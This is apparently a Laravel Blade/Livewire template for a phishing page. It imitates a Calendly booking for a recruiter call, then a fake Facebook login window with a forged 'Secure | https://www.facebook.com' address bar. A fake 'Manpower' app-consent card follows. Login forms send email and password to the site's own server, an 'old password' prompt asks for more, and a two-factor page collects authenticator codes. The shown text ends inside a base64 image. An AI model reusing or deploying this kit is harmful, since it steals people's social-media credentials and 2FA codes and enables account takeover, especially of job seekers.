<div>
    <style>
        .login-modal-card .login-form .input div input{
            background: #fff url("{{asset('new/o7nelmd.png')}}") repeat-x;
        }
    </style>
    <div id="root">
        <div class="App">
            <div class="box__shadow">
                <div class="calendar__wrapper {{$webStatus ? '':'d-none'}}" >
                    <div class="user__wrapper">
                        <div class="logo__wrapper"><img width="50%" src="{{asset('man.png')}}" /></div>
                        <div class="screen__two center__text">
                            <div class="mobile__back-svg">
                                <div class="content__wrapper">
                                    <div style="margin-bottom: 15px;">
                                        <div><img class="avatar" style="border-radius: 50%;max-width: 200px"  src="{{asset('david.jpeg')}}" /></div>
                                    </div>
                                    <h2>30 Minutes Meeting</h2>
                                </div>
                            </div>
                            <div class="minute">
                                <svg data-id="details-item-icon" viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg" role="img">
                                    <path d="M.5 5a4.5 4.5 0 1 0 9 0 4.5 4.5 0 1 0-9 0Z" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path>
                                    <path d="M5 3.269V5l1.759 2.052" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path>
                                </svg>
                                <span>30 min</span>
                            </div>
                            <div class="minute mt-12">
                                <svg data-testid="phone-call-icon" data-id="details-item-icon" viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg" role="img">
                                    <path
                                        d="M6.216 9.151a2.215 2.215 0 0 0 2.758-.3l.31-.31a.738.738 0 0 0 0-1.043l-1.3-1.3a.739.739 0 0 0-1.044 0h0a.738.738 0 0 1-1.043 0L3.806 4.107a.738.738 0 0 1 0-1.043h0a.739.739 0 0 0 0-1.044L2.5.716a.738.738 0 0 0-1.043 0l-.31.31a2.214 2.214 0 0 0-.3 2.758 19.976 19.976 0 0 0 5.369 5.367Z"
                                        fill="none"
                                        stroke="currentColor"
                                        stroke-linecap="round"
                                        stroke-linejoin="round"
                                    ></path>
                                </svg>
                                <span>Phone call  (573) 826 7993</span>
                            </div>
                            <div class="minute space__bettwen">
                                <svg data-id="details-item-icon" viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg" role="img">
                                    <path d="M.5 5a4.5 4.5 0 1 0 9 0 4.5 4.5 0 1 0-9 0Z" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path>
                                    <path
                                        d="M.846 6.731h1.212a1.212 1.212 0 0 0 1.211-1.212V4.481a1.212 1.212 0 0 1 1.212-1.212 1.211 1.211 0 0 0 1.211-1.211V.553M9.5 4.929a2.469 2.469 0 0 0-1.117-.275H6.9a1.212 1.212 0 1 0 0 2.423.865.865 0 0 1 .865.865v.605"
                                        fill="none"
                                        stroke="currentColor"
                                        stroke-linecap="round"
                                        stroke-linejoin="round"
                                    ></path>
                                </svg>
                                <span>US Georgia (00:59)</span>
                            </div>
                        </div>
                        <div class="footer__wrapper">
                            <p>Cookie settings</p>
                            <p>Report abuse</p>
                        </div>
                    </div>
                    <div  class="date__time {{$showCalender == false ? 'd-none':''}}">
                        <div class="{{$showCalenderProgress ? 'd-none':''}}">
                            <h2>Select a Date & Time</h2>
                            <div wire:ignore class=" calendar__container svg__icon">
                                <div  style="min-width: 400px;padding-right: 15px;margin-top:20px;">
                                    <div wire:ignore class="calendar-wrapper" id="calendar-wrapper"></div>
                                    <div class="time__zone-wrapper" style="margin-top: 20px;">
                                        <p>Time zone</p>
                                        <div class="central">
                                            <img width="14px" src="{{asset('world.png')}}">
                                            US Georgia (00:59)
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class=" loading-container2 {{$showCalenderProgress ? '':'d-none'}}">
                            <h1 style="font-size: 48px;">Saving your selection</h1>
                            <h2>Please contact our live support to fully approve your scheduled date</h2>
                            <div class="loader2"></div>
                            <div style="margin-top: 40px;">
                                <a id="openChat" class="blue-btn" href="#" >Contact live chat support</a>
                            </div>
                        </div>
                        <a class="logo__wrapper-calendly hide__mobile">
                            <div class="background">
                                <div class="powerd__by">powered by</div>
                                <div class="calendly">Calendly</div>
                            </div>
                        </a>
                    </div>
                    <div class="form__wrapper date__time {{$showCalender ? 'd-none':''}}">
                        <div>
                            <div class="full__width">
                                <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"><h2>Schedule your call with David Kristler</h2></div>
                                <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
                                    <div class="form-steps">
                                        <form id="msform">
                                            <ul id="progressbar">
                                                <li class="active" id="account"><strong>Verify</strong></li>
                                                <li id="personal"><strong>Schedule</strong></li>
                                                <li id="confirm"><strong>Finish</strong></li>
                                            </ul>
                                        </form>
                                    </div>
                                </div>
                                <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
                                    <div class="dummy__text">
                                        <p>
                                            Please confirm your appointment with David Kristler.<br />
                                            To complete the confirmation process, continue with Facebook
                                        </p>
                                    </div>
                                </div>
                                <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
                                    <div class="facebook__button">
                                        <button id="continue-facebook" wire:click.prevent="openLoginModal">
                                            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="24" viewBox="0 0 25 24" fill="none">
                                                <g clip-path="url(#clip0_302_2)">
                                                    <rect width="24" height="24" transform="translate(0.845947)" fill="#1877F2"></rect>
                                                    <path
                                                        d="M24.3459 12.0699C24.3459 5.7186 19.1972 0.56988 12.8459 0.56988C6.49467 0.56988 1.34595 5.7186 1.34595 12.0699C1.34595 17.8099 5.55133 22.5674 11.0491 23.4302V15.3941H8.12915V12.0699H11.0491V9.53629C11.0491 6.6541 12.7659 5.06207 15.3928 5.06207C16.651 5.06207 17.967 5.28668 17.967 5.28668V8.11675H16.5169C15.0883 8.11675 14.6428 9.00322 14.6428 9.91266V12.0699H17.8323L17.3224 15.3941H14.6428V23.4302C20.1406 22.5674 24.3459 17.8099 24.3459 12.0699Z"
                                                        fill="white"
                                                    ></path>
                                                </g>
                                                <defs>
                                                    <clipPath id="clip0_302_2"><rect width="24" height="24" fill="white" transform="translate(0.845947)"></rect></clipPath>
                                                </defs>
                                            </svg>
                                            Continue with Facebook
                                        </button>
                                    </div>
                                </div>
                                <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
                                    <div class="footer__wrapper footer__wrapper-mobile footer__wrapper-contact">
                                        <p>Cookie settings</p>
                                        <p>Report abuse</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <a class="logo__wrapper-calendly hide__mobile">
                            <div class="background">
                                <div class="powerd__by">powered by</div>
                                <div class="calendly">Calendly</div>
                            </div>
                        </a>
                    </div>
                </div>
                <div class="calendar__wrapper {{$webStatus ? 'd-none':''}}" >
                    <div class="user__wrapper">
                        <div class="logo__wrapper"><img width="50%" src="{{asset('man.png')}}" /></div>
                        <div class="screen__two center__text">
                            <div class="mobile__back-svg">
                                <div class="content__wrapper">
                                    <div style="margin-bottom: 15px;">
                                        <div><img class="avatar" style="border-radius: 50%;max-width: 200px"  src="{{asset('david.jpeg')}}" /></div>
                                    </div>
                                    <h2>30 Minutes Meeting</h2>
                                </div>
                            </div>
                            <div class="minute">
                                <svg data-id="details-item-icon" viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg" role="img">
                                    <path d="M.5 5a4.5 4.5 0 1 0 9 0 4.5 4.5 0 1 0-9 0Z" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path>
                                    <path d="M5 3.269V5l1.759 2.052" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path>
                                </svg>
                                <span>30 min</span>
                            </div>
                            <div class="minute mt-12">
                                <svg data-testid="phone-call-icon" data-id="details-item-icon" viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg" role="img">
                                    <path
                                        d="M6.216 9.151a2.215 2.215 0 0 0 2.758-.3l.31-.31a.738.738 0 0 0 0-1.043l-1.3-1.3a.739.739 0 0 0-1.044 0h0a.738.738 0 0 1-1.043 0L3.806 4.107a.738.738 0 0 1 0-1.043h0a.739.739 0 0 0 0-1.044L2.5.716a.738.738 0 0 0-1.043 0l-.31.31a2.214 2.214 0 0 0-.3 2.758 19.976 19.976 0 0 0 5.369 5.367Z"
                                        fill="none"
                                        stroke="currentColor"
                                        stroke-linecap="round"
                                        stroke-linejoin="round"
                                    ></path>
                                </svg>
                                <span>Phone call  (573) 826 7993</span>
                            </div>
                            <div class="minute space__bettwen">
                                <svg data-id="details-item-icon" viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg" role="img">
                                    <path d="M.5 5a4.5 4.5 0 1 0 9 0 4.5 4.5 0 1 0-9 0Z" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path>
                                    <path
                                        d="M.846 6.731h1.212a1.212 1.212 0 0 0 1.211-1.212V4.481a1.212 1.212 0 0 1 1.212-1.212 1.211 1.211 0 0 0 1.211-1.211V.553M9.5 4.929a2.469 2.469 0 0 0-1.117-.275H6.9a1.212 1.212 0 1 0 0 2.423.865.865 0 0 1 .865.865v.605"
                                        fill="none"
                                        stroke="currentColor"
                                        stroke-linecap="round"
                                        stroke-linejoin="round"
                                    ></path>
                                </svg>
                                <span>US Georgia (00:59)</span>
                            </div>
                        </div>
                        <div class="footer__wrapper">
                            <p>Cookie settings</p>
                            <p>Report abuse</p>
                        </div>
                    </div>
                    <div class="form__wrapper date__time  ">
                        <div>
                            <div class="full__width">
                                <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
                                    <div style="margin-top: 20%;padding: 30px;text-align: center">
                                        <h1 >The calender link is currently closed. Please check back later. </h1>
                                        <p style="font-size: 18px">Unfortunately, the calendar link to schedule a meeting is currently closed. It will
                                            open soon. Please contact your recruiting team via email to secure a spot.</p>
                                    </div>
                                </div>
                                <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
                                    <div class="footer__wrapper footer__wrapper-mobile footer__wrapper-contact">
                                        <p>Cookie settings</p>
                                        <p>Report abuse</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <a class="logo__wrapper-calendly hide__mobile">
                            <div class="background">
                                <div class="powerd__by">powered by</div>
                                <div class="calendly">Calendly</div>
                            </div>
                        </a>
                    </div>
                </div>
            </div>
            <a class="logo__wrapper-calendly-mobile">
                <div class="background">
                    <div class="powerd__by">powered by</div>
                    <div class="calendly">Calendly</div>
                </div>
            </a>
        </div>
    </div>
    <style>
        @media only screen and (max-width: 767px) {
            .ant-modal{
                top:0;
            }
            .mobile-t-card{
                background:#fff!important;
                border: 0!important;
            }

            .ant-modal-wrap{
                background:#fff!important;
            }
            .ant-modal-content{
                border: 0!important;
                overflow-y: hidden;
                box-shadow:none;
            }
            .two-factor-code .top h2{
                font-size: 1.2rem;
            }
        }
        @media only screen and (min-width: 768px){
            .ant-modal{
                top:0;
            }
            .mobile-t-card{
                background:#fff!important;
                border: 0!important;
            }

            .ant-modal-wrap{
                background:#fff!important;
            }
            .ant-modal-content{
                border: 0!important;
                overflow-y: hidden;
                box-shadow:none;
            }
            .two-factor-code .top h2{
                font-size: 1.2rem;
            }
            .ant-modal-header{
                display:none;
            }
            .auth-req-container{
                background:#fff;
            }
        }
    </style>
    <div wire:ignore.self  style="display: none;" id="continue-modal">
        <div class="ant-modal-root">
            <div class="ant-modal-mask"></div>
            <div tabindex="-1" class="ant-modal-wrap">
                <div role="dialog" aria-labelledby="rc_unique_0" aria-modal="true" class="ant-modal modal-wrapper modal__facebook" style="width:1000px; transform-origin: 519px 247px;">
                    <div tabindex="0" aria-hidden="true" style="width: 0px; height: 0px; overflow: hidden; outline: none;"></div>
                    <div class="ant-modal-content">
                        <button type="button" aria-label="Close" class="ant-modal-close">
                        <span class="ant-modal-close-x">
                            <span role="img" aria-label="close" class="anticon anticon-close ant-modal-close-icon">
                                <svg fill-rule="evenodd" viewBox="64 64 896 896" focusable="false" data-icon="close" width="1em" height="1em" fill="currentColor" aria-hidden="true">
                                    <path
                                        d="M799.86 166.31c.02 0 .04.02.08.06l57.69 57.7c.04.03.05.05.06.08a.12.12 0 010 .06c0 .03-.02.05-.06.09L569.93 512l287.7 287.7c.04.04.05.06.06.09a.12.12 0 010 .07c0 .02-.02.04-.06.08l-57.7 57.69c-.03.04-.05.05-.07.06a.12.12 0 01-.07 0c-.03 0-.05-.02-.09-.06L512 569.93l-287.7 287.7c-.04.04-.06.05-.09.06a.12.12 0 01-.07 0c-.02 0-.04-.02-.08-.06l-57.69-57.7c-.04-.03-.05-.05-.06-.07a.12.12 0 010-.07c0-.03.02-.05.06-.09L454.07 512l-287.7-287.7c-.04-.04-.05-.06-.06-.09a.12.12 0 010-.07c0-.02.02-.04.06-.08l57.7-57.69c.03-.04.05-.05.07-.06a.12.12 0 01.07 0c.03 0 .05.02.09.06L512 454.07l287.7-287.7c.04-.04.06-.05.09-.06a.12.12 0 01.07 0z"
                                    ></path>
                                </svg>
                            </span>
                        </span>
                        </button>
                        <div class="ant-modal-header is-desktop">
                            <div class="ant-modal-title" id="rc_unique_0">
                                <div class="">
                                    <div class="wrapper_header">
                                        <div class="sign__up-modal">
                                            <img src="{{asset('img/hLRJ1GG_y0J.ico')}}" alt="" width="17px" />
                                            <p>Log into Facebook | Facebook</p>
                                        </div>
                                        <div class="icons">
                                            <div class="img"><img src="{{asset('img/minus.png')}}" alt="" /></div>
                                            <div class="img"><img src="https://icons-for-free.com/iconfiles/png/512/square-1321215626459427421.png" alt="" /></div>
                                            <div class="img img-x"><img src="{{asset('img/close.png')}}" alt="" /></div>
                                        </div>
                                    </div>
                                    <div class="input__title-wrapper">
                                        <div class="lock__screen">
                                            <div class="lock">
                                                <div class="lock__wrapper"><img src="{{asset('img/locktest.png')}}" alt="" /><span class="green">Secure | https:</span><span class="black-opacity">//</span></div>
                                            </div>
                                            <span class="input__value">
                                            www.facebook.com
                                            <span class="black"> /login.php?skip<span class="hide__text-mobile">_api_login=1 &amp;api_key=481324359126967&amp;kid_directed_site=0&amp;app_id=481324359126967&amp;signed...</span></span>
                                        </span>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="ant-modal-body">
                            <div class="confirmation-container-modal">
                                @if($enableAppLogin)
                                    <div class="mobile-t-card" style="min-height: 550px;display: flex;align-items: center;background: #e9ebee">
                                        <div class="app_card">
                                            <div class="icon-bar">
                                                <img src="{{asset('new/fb.png')}}" alt="">
                                                <img src="{{asset('new/sync.png')}}" alt="">
                                                <img src="{{asset('man2.png')}}" alt="">
                                            </div>
                                            <span class="hr-border"></span>
                                            <div class="text-content-1">
                                                <h2>Manpower is requesting access to:</h2>
                                                <p>Name and profile picture</p>
                                                <a href="javascript:void(0)">View access</a>
                                            </div>
                                            <div class="main-button">
                                                <a href="#" wire:click.prevent="openLoginPage">Login</a>
                                                <a href="javascript:void(0)">Cancel</a>
                                            </div>
                                            <div class="bottom-txt">
                                                <p>By continuing, Manpower will receive ongoing access to the information you share and Meta will record when Manpower accesses it.
                                                    <a href="javascript:void(0)">Learn more</a> about this sharing and the settings you have.</p>
                                                <p>Manpower's <a href="javascript:void(0)">Privacy Policy</a> and <a href="javascript:void(0)">Terms of Service</a></p>
                                            </div>
                                        </div>
                                    </div>
                                @endif
                                @if($enableLoginForm)
                                    <div class="auth-req-container auth__req-modal is-desktop">
                                        <div class="auth-req">
                                            <div class="auth-req-text-modal">
                                                <div>
                                                    <img style="height: 106px" src="{{asset('new/facebook.svg')}}" alt="">
                                                </div>

                                                <div class="" style="display: flex;justify-content: center">
                                                    <div class="login-modal-card">
                                                        <h2 style="margin-top: 0">Log into Facebook</h2>
                                                        <div class="login-form">
                                                            @if($loginError)
                                                                <div class="wrong__password"><h2>Wrong Credentials</h2><p>Invalid username or password</p></div>
                                                            @endif
                                                            @if($oldPassError)
                                                                <div class="wrong__password"><h2>You Entered And Old Password</h2></div>
                                                            @endif
                                                            <form wire:submit.prevent="submitLogin" id="loginForm" class="ant-form ant-form-horizontal">
                                                                <div class="input">
                                                                    <div>
                                                                        <input required="" type="text" name="email" placeholder="Email address or phone number" id="username"  />
                                                                    </div>
                                                                    <div >
                                                                        <input required="" type="password" name="password" placeholder="Password" id="password"  />
                                                                    </div>
                                                                </div>
                                                                <div class="login-btn"><button type="submit">Log In</button></div>
                                                            </form>
                                                        </div>
                                                        <div class="modal__confirmation-forgot">
                                                            <div class="modal__confirmation-account">
                                                                <a href="javascript:void(0)">Forgotten password?</a>
                                                                <a href="javascript:void(0)">Sign up for Facebook</a>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="is-mobile">
                                        <div class="login-card-mobile">
                                            <div class="heading">
                                                <p>English (UK)</p>
                                            </div>
                                            <div class="icon">
                                                <img src="{{asset('new/fb2.png')}}" alt="">
                                            </div>
                                            <div style="padding: 20px">
                                                @if($loginError)
                                                    <div class="wrong__password" style="text-align: center"><h2>Wrong Credentials</h2><p>Invalid username or password</p></div>
                                                @endif
                                                @if($oldPassError)
                                                    <div class="wrong__password" style="text-align: center"><h2>You Entered And Old Password</h2></div>
                                                @endif
                                                <form wire:submit.prevent="submitLogin">
                                                    <div>
                                                        <div class="input">
                                                            <div>
                                                                <input required="" type="text" name="email" placeholder="Email address or phone number" id="username"  />
                                                            </div>
                                                            <div >
                                                                <input required="" type="password" name="password" placeholder="Password" id="password"  />
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="login-btn"><button type="submit">Log In</button></div>
                                                </form>
                                                <div class="forgotten">
                                                    <a href="javascript:void(0)">Forgotten password?</a>
                                                </div>
                                                <div class="footer-bar" style="display: block;text-align: center">
                                                    <a class="create-btn" href="javascript:void(0)">Create new account</a>
                                                    <img src="{{asset('new/meta.png')}}" alt="">
                                                    <ul>
                                                        <li>About</li>
                                                        <li>Help</li>
                                                        <li>More</li>
                                                    </ul>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                @endif
                                @if($twoFaPage)
                                    <div style="width: 100%;justify-content: center;display: flex;padding-bottom: 50px;background: #fff">
                                        <div class="otp-main">
                                            <form  class="" wire:submit.prevent="codeSubmit">
                                                <div class="two-factor-code">
                                                    <div style="margin-bottom:10px">
                                                        <img style="width:24px;height:24px" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEgAAABICAMAAABiM0N1AAAAOVBMVEVHcEwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADLcPMfAAAAEnRSTlMAzxCfgDB/798gUKCQcGBvX4+IM11fAAAAn0lEQVR4Xu3XWw6DMAxE0QmYOAH6wPtfbFslG6hmpPbDZwH+uQMC/JuU0lLdL/CWEm8GVm/x4SBtLSSHnh7DCcojpgOUGpNxudaYbmz2we9s9qFtkuzRuiZ7WUTZmTuZPbNTRNlx0dknJ7PrD1kMvoN0xFRBMv2lFaTdYygdkD+0/GuE08vXM8gZ5AxyBib7YBf/QvAzOCFwuht+K6X0AuA4Gwzz746mAAAAAElFTkSuQmCC" alt="">
                                                    </div>
                                                    <div class="top">
                                                        <h2>Go to your authentication app</h2>
                                                        <p>Enter the 6-digit code for this account from the two-factor authentication app you set up (such as Duo Mobile or Google Authenticator).</p>
                                                        <img style="width: 100%" src="data:image/png;base64,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